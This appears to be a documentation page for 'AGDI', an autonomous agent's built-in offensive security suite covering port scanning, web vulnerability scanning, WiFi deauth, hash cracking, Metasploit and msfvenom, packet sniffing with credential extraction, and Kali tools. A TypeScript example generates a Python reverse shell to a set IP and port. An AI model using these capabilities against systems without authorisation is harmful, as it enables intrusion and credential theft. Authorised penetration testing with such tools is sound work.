---
title: "Security Suite"
description: "AGDI's built-in cybersecurity toolkit — network recon, web scanning, WiFi attacks, exploit engine, and 100+ Kali Linux tools."
---

# Security Suite

AGDI includes a full offensive security toolkit built into the autonomous agent. Every tool runs as native TypeScript with fallback to system binaries.

## Modules

<Columns>
  <Card title="Network Recon" href="/autonomous/security/network-recon" icon="radar">
    Port scanning, host discovery, DNS enumeration, traceroute.
  </Card>
  <Card title="Web Scanner" href="/autonomous/security/web-scanner" icon="globe">
    SQLi, XSS, directory brute-forcing, header audit, SSL/TLS analysis.
  </Card>
  <Card title="WiFi Security" href="/autonomous/security/wifi" icon="wifi">
    Aircrack-ng suite, handshake capture, deauth, WPS testing.
  </Card>
  <Card title="Crypto Toolkit" href="/autonomous/security/crypto" icon="key-round">
    Hash cracking, encoding/decoding, password generation.
  </Card>
  <Card title="Exploit Engine" href="/autonomous/security/exploits" icon="skull">
    Metasploit bridge, msfvenom, reverse shells, CVE lookup.
  </Card>
  <Card title="Packet Sniffer" href="/autonomous/security/packets" icon="radio">
    Live capture, PCAP analysis, credential extraction.
  </Card>
  <Card title="Kali Linux Tools" href="/autonomous/security/kali" icon="terminal">
    Direct access to 100+ tools across 11 categories.
  </Card>
</Columns>

## Quick Example

```typescript
import { NetworkRecon, WebSecurityScanner, ExploitEngine } from "agdi/autonomous";

// Port scan
const recon = new NetworkRecon();
const result = await recon.scanPorts({
  target: "10.0.0.1",
  ports: "1-1024",
  technique: "syn",
  serviceDetection: true,
});

// Web vulnerability scan
const scanner = new WebSecurityScanner();
const findings = await scanner.fullScan({
  url: "https://target.com",
  depth: 3,
});

// Generate reverse shell
const exploit = new ExploitEngine();
const shell = exploit.reverseShellOneLiner("10.0.0.5", 4444, "python");
```

## Tool Audit

Check which security tools are installed on your system:

```typescript
import { auditKaliTools } from "agdi/autonomous";

const audit = await auditKaliTools();
console.log(`${audit.installed.length}/${audit.total} tools installed`);
console.log("Missing:", audit.missing);
```
